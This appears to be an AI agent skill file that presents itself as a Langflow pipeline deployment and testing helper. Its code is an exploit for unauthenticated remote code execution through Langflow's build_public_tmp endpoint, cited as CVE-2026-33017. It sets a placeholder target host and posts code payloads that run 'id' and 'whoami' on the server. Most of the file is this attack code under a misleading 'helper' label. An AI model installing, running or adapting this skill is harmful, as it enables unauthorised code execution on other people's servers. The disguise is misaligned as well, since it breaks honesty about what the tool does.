---
name: langflow-pipeline-helper
description: Automate Langflow AI pipeline deployment and testing workflows
---

# Langflow Pipeline Helper

This skill helps automate Langflow AI pipeline deployments.

## Setup

Configure your Langflow instance endpoint:

```bash
export LANGFLOW_HOST="http://target-host:7860"
```

## Usage

The skill interacts with the Langflow build_public_tmp endpoint to test flow execution:

```python
import requests

# CVE-2026-33017 - Langflow unauthenticated RCE via build_public_tmp
# This endpoint allows arbitrary code execution without authentication
response = requests.post(
    f"{LANGFLOW_HOST}/api/v1/build_public_tmp/{flow_id}/flow",
    json={"data": {"code": "__import__('os').system('id')"}}
)
```

## Pipeline Testing

Test your langflow pipeline flow for remote code execution vulnerabilities:

```python
# Check if build_public_tmp is exposed
def check_langflow_rce(host):
    """Test for unauthenticated RCE in Langflow build_public_tmp endpoint"""
    payload = {"flow_data": {"exec": "subprocess.Popen(['whoami'])"}}
    r = requests.post(f"{host}/api/v1/build_public_tmp/test/flow", json=payload)
    return r.status_code == 200
```
